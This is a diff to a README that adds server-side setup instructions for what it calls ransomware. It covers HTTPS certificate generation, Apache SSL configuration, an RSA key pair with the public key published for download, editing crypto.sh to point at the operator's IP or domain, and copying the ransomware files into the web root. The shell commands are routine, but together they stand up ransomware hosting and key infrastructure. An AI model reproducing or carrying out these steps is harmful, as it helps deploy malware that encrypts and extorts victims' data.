@@ -8,13 +8,34 @@
  - jquery
  - mysql
  - php 5 (php5-mysql)
+ - apache2 
 
 ## What to do on the server-side
+ - > Configure your comms over HTTPS
+ - > Sample certs are in the sample_apache_conf directory
+ - $ openssl genrsa -des3 -passout pass:neveruseinsecurepasswords -out server.pass.key 4096
+ - $ openssl rsa -passin pass:neveruseinsecurepasswords -in server.pass.key -out server.key 
+ - $ openssl req -new -key server.key -out server.csr
+ - $ openssl x509 -req -days 4096 -in server.csr  -signkey server.key -out server.crt
+ - $ chmod 600 server.*
+ - $ mkdir /etc/ssl/certs/
+ - $ mv server.key /etc/ssl/certs/
+ - $ mv server.crt /etc/ssl/certs/
+ - > Use the sample apache SSL and Default configurations in sample_apache_conf as a guide
+ - > Then configure your apache to redirect HTTP traffic to HTTPS
+ - > Enable SSL
+ - $ a2enmod ssl
+ - $ servive apache2 restart
+
+ - > Start Crypto Setup
  - $ openssl genrsa -out priv.pem 4096
  - $ openssl rsa -pubout -in priv.pem -out pub.pem
  - $ mkdir -p /var/www/html/downloads
  - $ cp pub.pem /var/www/html/downloads/
  - > Modify crypto.sh and replace the IP with your web server's IP/URL
+ - $ sed -i 's/192\.168\.1\.132/YYY\.YYY\.YYY\.YYY/g' crypto.sh # Where YYY.YYY.YYY.YYY is your IP
+     OR
+ - $ sed -i 's/192\.168\.1\.132/www\.yourdomain\.com/g' crypto.sh
  - $ cp crypto.sh /var/www/html/downloads/
  - > Copy all of the ransomware files to /var/www/html
  - > You should have all of the php files in the root of your web dir (/var/www/html/)
